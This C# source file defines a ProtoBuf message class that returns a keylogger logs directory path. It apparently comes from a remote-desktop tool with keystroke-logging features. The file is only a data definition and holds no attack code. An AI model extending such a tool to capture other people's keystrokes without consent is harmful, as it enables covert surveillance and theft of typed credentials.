using ProtoBuf;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Message.SubMessages
{
    [ProtoContract]
    public class GetKeyloggerLogsDirectoryResponse : IMessage
    {
        [ProtoMember(1)]
        public string LogsDirectory { get; set; }
    }
}